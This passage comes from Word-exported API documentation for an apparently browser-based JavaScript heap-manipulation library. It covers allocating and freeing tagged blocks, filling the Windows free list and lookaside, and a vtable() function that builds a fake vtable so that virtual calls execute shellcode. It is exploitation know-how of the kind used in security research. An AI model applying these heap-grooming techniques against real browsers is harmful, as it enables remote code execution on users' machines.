  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>addr - integer representation of the
  address <o:p></o:p></span></p>
  </div>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Example: <o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>heap.addr(0x1523D200)<span
  style='mso-spacerun:yes'>      </span>// returns the equivalent of<o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'><span
  style='mso-spacerun:yes'>                           </span>//
  unescape(&quot;%uD200%u1523&quot;)<o:p></o:p></span></p>
  </div>
  </td>
 </tr>
</table>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Memory
allocation<o:p></o:p></span></h3>

<table class=MsoNormalTable border=1 cellspacing=0 cellpadding=0 width=880
 style='width:660.0pt;background:#F9F9F9;border-collapse:collapse;border:none;
 mso-border-alt:solid #AAAAAA .75pt'>
 <tr style='mso-yfti-irow:0;mso-yfti-firstrow:yes'>
  <td width=264 style='width:198.0pt;border:solid #AAAAAA 1.0pt;mso-border-alt:
  solid #AAAAAA .75pt;background:#F2F2F2;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal align=center style='margin-top:12.0pt;margin-right:0cm;
  margin-bottom:12.0pt;margin-left:0cm;text-align:center'><b><span lang=EN-US
  style='font-size:9.5pt;font-family:Verdana;color:#404040'>Function<o:p></o:p></span></b></p>
  </td>
  <td style='border:solid #AAAAAA 1.0pt;border-left:none;mso-border-left-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;background:#F2F2F2;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal align=center style='margin-top:12.0pt;margin-right:0cm;
  margin-bottom:12.0pt;margin-left:0cm;text-align:center'><b><span lang=EN-US
  style='font-size:9.5pt;font-family:Verdana;color:#404040'>Description<o:p></o:p></span></b></p>
  </td>
 </tr>
 <tr style='mso-yfti-irow:1'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>alloc(arg, tag)<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>Allocates a block of a specified size with the system
  memory allocator. A call to this function is equivalent to a call to HeapAlloc().
  If the first argument is a number, it specifies the size of the new block,
  which is filled with &quot;A&quot; characters. If the argument is a string,
  its data is copied into a new block of size </span><span class=code><span
  lang=EN-US style='font-size:9.0pt;color:#404040'>arg.length&nbsp;*&nbsp;2&nbsp;+&nbsp;6</span></span><span
  lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>. In
  both cases the size of the new block must be a multiple of 16 and not equal
  to 32, 64, 256 or 32768. <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>Arguments: <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l1 level1 lfo8;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>arg - size of the memory block in bytes,
  or a string to strdup <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l1 level1 lfo8;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>tag - a tag identifying the memory block
  (optional) <o:p></o:p></span></p>
  </div>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Example: <o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>heap.alloc(512,
  &quot;foo&quot;) // allocates a 512 byte block tagged with<o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'><span
  style='mso-spacerun:yes'>                       </span>// &quot;foo&quot; and
  fills it with &quot;A&quot; characters<o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'><o:p>&nbsp;</o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>heap.alloc(&quot;BBBBB&quot;)<span
  style='mso-spacerun:yes'>    </span>// allocates a 16 byte block with no tag<o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'><span
  style='mso-spacerun:yes'>                       </span>// and copies the
  string &quot;BBBBB&quot; into it<o:p></o:p></span></p>
  </div>
  </td>
 </tr>
 <tr style='mso-yfti-irow:2'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>free(tag)<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Frees all memory blocks marked with a specific tag with the
  system memory allocator. A call to this function is equivalent to a call to
  HeapFree(). <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Arguments: <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l10 level1 lfo9;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>tag - a tag identifying the group of
  blocks to be freed <o:p></o:p></span></p>
  </div>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Example: <o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>heap.free(&quot;foo&quot;)<span
  style='mso-spacerun:yes'>     </span>// free all memory blocks tagged with
  &quot;foo&quot;<o:p></o:p></span></p>
  </div>
  </td>
 </tr>
 <tr style='mso-yfti-irow:3;mso-yfti-lastrow:yes'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>gc()<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Runs the garbage collector and flushes the OLEAUT32 cache.
  Call this function before before using alloc() and free().<o:p></o:p></span></p>
  </td>
 </tr>
</table>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Heap
manipulation<o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
following functions are used for manipulating the data structures of the memory
allocator in Windows 2000, XP and 2003. The heap allocator in Windows Vista is
not supported, due to its significant differences.<o:p></o:p></span></p>

<table class=MsoNormalTable border=1 cellspacing=0 cellpadding=0 width=880
 style='width:660.0pt;background:#F9F9F9;border-collapse:collapse;border:none;
 mso-border-alt:solid #AAAAAA .75pt'>
 <tr style='mso-yfti-irow:0;mso-yfti-firstrow:yes'>
  <td width=264 style='width:198.0pt;border:solid #AAAAAA 1.0pt;mso-border-alt:
  solid #AAAAAA .75pt;background:#F2F2F2;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal align=center style='margin-top:12.0pt;margin-right:0cm;
  margin-bottom:12.0pt;margin-left:0cm;text-align:center'><b><span lang=EN-US
  style='font-size:9.5pt;font-family:Verdana;color:#404040'>Function<o:p></o:p></span></b></p>
  </td>
  <td style='border:solid #AAAAAA 1.0pt;border-left:none;mso-border-left-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;background:#F2F2F2;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal align=center style='margin-top:12.0pt;margin-right:0cm;
  margin-bottom:12.0pt;margin-left:0cm;text-align:center'><b><span lang=EN-US
  style='font-size:9.5pt;font-family:Verdana;color:#404040'>Description<o:p></o:p></span></b></p>
  </td>
 </tr>
 <tr style='mso-yfti-irow:1'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>freeList(arg, count)<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>Adds blocks of the specified size to the free list and
  makes sure they are not coalesced. The heap must be defragmented before
  calling this function. If the size of the memory blocks is less than 1024,
  you have to make sure that the lookaside is full. <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>Arguments: <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l6 level1 lfo10;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>arg - size of the new block in bytes, or a
  string to strdup <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l6 level1 lfo10;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>count - how many free blocks to add to the
  list (defaults to 1) <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Example: <o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>heap.freeList(&quot;BBBBB&quot;,
  5) // adds 5 blocks containing the<o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'><span
  style='mso-spacerun:yes'>                          </span>// string
  &quot;BBBBB&quot; to the free list<o:p></o:p></span></p>
  </div>
  </div>
  </td>
 </tr>
 <tr style='mso-yfti-irow:2'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>lookaside()<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Adds blocks of the specified size to the lookaside. The
  lookaside must be empty before calling this function. <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Arguments: <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l4 level1 lfo11;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>arg - size of the new block in bytes, or a
  string to strdup <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l4 level1 lfo11;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>count - how many blocks to add to the
  lookaside (defaults to 1) <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Example: <o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>heap.lookaside(&quot;BBBBB&quot;,
  5) // puts 5 blocks containing the<o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'><span
  style='mso-spacerun:yes'>                           </span>// string
  &quot;BBBBB&quot; on the lookaside<o:p></o:p></span></p>
  </div>
  </div>
  </td>
 </tr>
 <tr style='mso-yfti-irow:3'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>lookasideAddr()<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Return the address of the head of the lookaside linked list
  for blocks of a specified size. Uses the <i>heapBase</i> parameter from the <i>heapLib.ie</i>
  constructor. <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Arguments: <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l14 level1 lfo12;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>arg - size of the new block in bytes, or a
  string to strdup <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Example: <o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>heap.lookasideAddr(&quot;BBBBB&quot;)
  // returns 0x150718<o:p></o:p></span></p>
  </div>
  </div>
  </td>
 </tr>
 <tr style='mso-yfti-irow:4;mso-yfti-lastrow:yes'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>vtable(shellcode, jmpecx, size)<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Returns a fake vtable that contains shellcode. The caller
  should free the vtable to the lookaside and use the address of the lookaside
  head as an object pointer. When the vtable is used, the address of the object
  must be in eax and the pointer to the vtable must be in ecx. Any virtual
  function call through the vtable from ecx+8 to ecx+0x80 will result in
  shellcode execution. This function uses the heap. <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Arguments: <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l12 level1 lfo13;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>shellcode - shellcode string <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l12 level1 lfo13;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>jmpecx - address of a jmp ecx or
  equivalent instruction <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l12 level1 lfo13;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>size - size of the vtable to generate
  (defaults to 1008 bytes) <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Example: <o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
